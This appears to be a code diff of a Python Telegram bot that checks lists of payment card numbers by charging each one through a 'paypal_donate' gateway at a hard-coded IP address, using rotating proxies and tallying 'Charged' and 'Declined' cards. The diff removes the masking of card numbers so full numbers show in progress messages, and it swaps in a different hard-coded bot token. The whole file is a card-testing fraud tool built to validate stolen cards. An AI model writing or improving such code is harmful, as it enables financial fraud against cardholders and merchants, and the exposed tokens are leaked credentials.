@@ -2,7 +2,7 @@ from telebot import TeleBot, types
 import requests
 import time
 
-bot = TeleBot("8663863938:AAG9rm2FS5OpYHnRAnUql0r7oMJFyGMLwLs")
+bot = TeleBot("8663863938:AAFICTPn4o7oUx_6f7fUIT9fKp65p70gHWI")
 
 GATEWAY = "http://138.128.240.15:8025/paypal_donate?cc="
 
@@ -26,7 +26,7 @@ def get_proxy():
 
 @bot.message_handler(commands=['start'])
 def start(m):
-    bot.send_message(m.chat.id, "✅ **Same as Screenshot Mode ON**\n/chk — txt file bhej")
+    bot.send_message(m.chat.id, "✅ **Format Updated**")
 
 @bot.message_handler(commands=['chk'])
 def chk_file(m):
@@ -50,8 +50,10 @@ def handle_file(m):
     live = 0
     dead = 0
 
-    # Progress message
     progress_msg = bot.send_message(m.chat.id, "🔄 Starting check...")
+
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("🛑 Stop", callback_data="stop_check"))
 
     for i, card in enumerate(cards):
         if stop_flags.get(m.chat.id):
@@ -59,16 +61,15 @@ def handle_file(m):
             break
 
         proxy = get_proxy()
-        current_card = card[:12] + "****"
 
-        # Update current card
         bot.edit_message_text(
-            f"🔄 Checking {i+1}/{len(cards)}\n"
-            f"**Current Card:** `{current_card}`\n"
-            f"✅ Charged: {live}\n"
-            f"❌ Declined: {dead}\n"
-            f"📊 Total: {len(cards)}",
-            m.chat.id, progress_msg.message_id
+            f"💳 **Current card:**\n`{card}`\n\n"
+            f"📊 **Status:** Checking...\n"
+            f"💎 **Charged:** {live}\n"
+            f"❌ **Declined:** {dead}\n"
+            f"📊 **Total:** {len(cards)}",
+            m.chat.id, progress_msg.message_id,
+            reply_markup=markup
         )
 
         try:
@@ -85,26 +86,19 @@ def handle_file(m):
         except:
             dead += 1
 
-        time.sleep(1.2)  # speed control
+        time.sleep(1.2)
 
-    # Final result
     bot.edit_message_text(
-        f"✅ **CHECKING COMPLETE**\n"
-        f"✅ Charged: {live}\n"
-        f"❌ Declined: {dead}\n"
-        f"📊 Total: {len(cards)}",
+        f"✅ **CHECKING COMPLETE**\n\n"
+        f"💎 **Charged:** {live}\n"
+        f"❌ **Declined:** {dead}\n"
+        f"📊 **Total:** {len(cards)}",
         m.chat.id, progress_msg.message_id
     )
 
-    # Stop button
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("Stop", callback_data="stop"))
-    bot.send_message(m.chat.id, "Process Complete", reply_markup=markup)
-
-@bot.callback_query_handler(func=lambda call: True)
-def callback_handler(call):
-    if call.data == "stop":
-        stop_flags[call.message.chat.id] = True
-        bot.answer_callback_query(call.id, "Stopping...")
+@bot.callback_query_handler(func=lambda call: call.data == "stop_check")
+def stop_check(call):
+    stop_flags[call.message.chat.id] = True
+    bot.answer_callback_query(call.id, "Stopping...")
 
 bot.infinity_polling()
